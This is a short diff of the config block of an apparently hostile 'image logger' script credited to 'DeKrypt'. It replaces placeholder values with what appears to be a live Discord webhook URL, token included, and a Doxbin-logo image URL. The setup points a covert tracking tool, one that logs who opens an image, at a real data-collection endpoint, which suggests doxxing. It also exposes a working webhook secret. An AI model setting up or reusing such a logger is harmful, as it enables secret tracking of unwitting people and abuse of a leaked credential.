@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334611409631449201/RV-bC2aRFH5s2CJsVNSgBhdA8TbdUXjPus9EKeaUP_zrzSV5fTqx5TLN0oDsF_lwCD_p",
+    "image": "https://images.search.yahoo.com/yhs/view;_ylt=AwrNZXgvQ6hnwS4Tqig2nIlQ;_ylu=c2VjA3NyBHNsawNpbWcEb2lkAzIxZTlmY2I3ZjUzY2IzY2Y2MzE5Y2VhMWNhMmU5ZGIyBGdwb3MDNARpdANiaW5n?back=https%3A%2F%2Fimages.search.yahoo.com%2Fyhs%2Fsearch%3Fp%3Ddoxbin%2Bpic%26ei%3DUTF-8%26type%3Dfc_A3EE5585A6B_s69_g_e_d_n1_c999%26fr%3Dyhs-fc-2374_2%26hsimp%3Dyhs-2374_2%26hspart%3Dfc%26param1%3D7%26param2%3DeJxFj8lOxDAQRH%252BljzNS7HR7SSbjU4DhAxAnLB9CYjJWVmVREF%252BPjECoDt2qfi1VtaGxxr08EaKWkmziRmtcnNG3iautcUVR2MSF2RqnBSehuNKcRKRaP1nj9tUmbq%252BsccP0Ffq%252BSjVHOB1hbKZjhXEDQo4GjjBmysBnps5QzXPvD%252F%252FehS3VMucyg1N334Y%252BgT50Hlpfd9MZ6vsyDT4lKThGwVp9VEv4e%252FFN%252B3%252BLIdfwG3xf%252FfKzXwgf9aVEpjJNjOj2zMoyF%252BxBi1yI8habR76OsEChGOZM4Cuqq9RXqbgk9fYNyWxUBw%253D%253D%26tab%3Dorganic%26ri%3D4&w=570&h=201&imgurl=static.wikia.nocookie.net%2Flogopedia%2Fimages%2Fb%2Fb3%2FDoxbin.png%2Frevision%2Flatest%3Fcb%3D20220529143722&rurl=https%3A%2F%2Flogos.fandom.com%2Fwiki%2FDoxbin&size=6KB&p=doxbin+pic&oid=21e9fcb7f53cb3cf6319cea1ca2e9db2&fr2=&fr=yhs-fc-2374_2&tt=Doxbin+%7C+Logopedia+%7C+Fandom&b=0&ni=90&no=4&ts=&tab=organic&sigr=OYtuiXI1we6L&sigb=epqlV5GFNjvS&sigi=IKKbawFFi2se&sigt=uYGrMiA5ivKC&.crumb=BgsrGmIzhqT&fr=yhs-fc-2374_2&hsimp=yhs-2374_2&hspart=fc&type=fc_A3EE5585A6B_s69_g_e_d_n1_c999&param1=7&param2=eJxFj8lOxDAQRH%2BljzNS7.XEDQo4GjjBmysBnps5QzXPvD%2F%2FehS3VMucyg1N334Y%2BgT50Hlpfd9MZ6vsyDT4lKThGwVp9VEv4e%2FFN%2B3%2BLIdfwG3xf%2FfKzXwgf9aVEpjJNjOj2zMoyF%2BxBi1yI8habR76OsEChGOZM4Cuqq9RXqbgk9fYNyWxUBw%3D%3D", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
